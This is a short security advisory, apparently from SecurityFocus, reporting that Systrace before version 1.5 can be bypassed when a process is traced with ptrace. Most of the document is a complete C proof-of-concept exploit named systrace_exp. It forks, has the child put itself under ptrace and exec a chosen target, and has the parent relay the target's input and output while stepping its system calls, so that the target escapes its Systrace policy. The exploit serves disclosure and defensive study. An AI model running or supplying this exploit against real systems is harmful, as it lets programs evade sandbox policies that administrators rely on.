source: http://www.securityfocus.com/bid/9998/info

Systrace has been reported prone to a vulnerability that may permit an application to completely bypass a Systrace policy. The issue presents itself because Systrace does not perform sufficient sanity checks while handling a process that is being traced with ptrace.

This issue is reported to have been silently patched in Systrace version 1.5, previous versions are believed to be prone to this vulnerability. 

#include <stdio.h>
#include <errno.h>
#include <sys/ptrace.h>
#include <sys/select.h>
#include <sys/time.h>
#include <sys/types.h>
#include <unistd.h>

int main(int argc, char *argv[])
{
        int pid;
        int input[2];
        int output[2];
        int error[2];
        int ret;
        fd_set readfds;

        if (argc < 2) {
                printf("usage: ./systrace_exp <target> <arg1> <arg2> ... <argn>\n");
                exit(0);
        }

        ret = pipe(input);
        if (ret) {
                printf("Unable to create pipe\n");
                exit(1);
        }
        ret = pipe(output);
        if (ret) {
                printf("Unable to create pipe\n");
                exit(1);
        }
        ret = pipe(error);
        if (ret) {
                printf("Unable to create pipe\n");
                exit(1);
        }

        pid = fork();

        if (pid > 0) {
                char somechar;
                int highest;
                struct timeval time;

                time.tv_sec = 0;
                time.tv_usec = 1000;

                close(input[0]);
                close(output[1]);
                close(error[1]);

                FD_ZERO(&readfds);
                FD_SET(0, &readfds);
                FD_SET(output[0], &readfds);
                FD_SET(error[0], &readfds);
                while (1) {
                        FD_SET(0, &readfds);
                        FD_SET(output[0], &readfds);
                        FD_SET(error[0], &readfds);
                        time.tv_sec = 0;
                        time.tv_usec = 1000;
                        while ((select(error[0] + 1, &readfds, NULL, NULL, &time)) > 0) {
                                if (FD_ISSET(0, &readfds)) {
                                        if (read(0, &somechar, 1) != 1)
                                                exit(0);
                                        write(input[1], &somechar, 1);
                                }
                                if (FD_ISSET(output[0], &readfds)) {
                                        if (read(output[0], &somechar, 1) != 1)
                                                exit(0);
                                        write(1, &somechar, 1);
                                }
                                if (FD_ISSET(error[0], &readfds)) {
                                        if (read(error[0], &somechar, 1) != 1)
                                                exit(0);
                                        write(2, &somechar, 1);
                                }
                                FD_SET(0, &readfds);
                                FD_SET(output[0], &readfds);
                                FD_SET(error[0], &readfds);
                                time.tv_sec = 0;
                                time.tv_usec = 1000;
                        }

                        ptrace(PTRACE_SYSCALL, pid, NULL, NULL);
                        if (errno == ESRCH)
                                break;
                }
        } else if (pid == 0) {
                close(input[1]);
                close(output[0]);
                close(error[0]);
                close(0);
                dup(input[0]);
                close(1);
                dup(output[1]);
                close(2);
                dup(error[1]);
                ptrace(PTRACE_TRACEME, 0, NULL, NULL);
                if (argc == 2)
                        execv(argv[1], NULL);
                else
                        execv(argv[1], argv + 1);
        } else {
                fprintf(stderr, "Unable to fork.\n");
                exit(1);
        }

        return 0;
}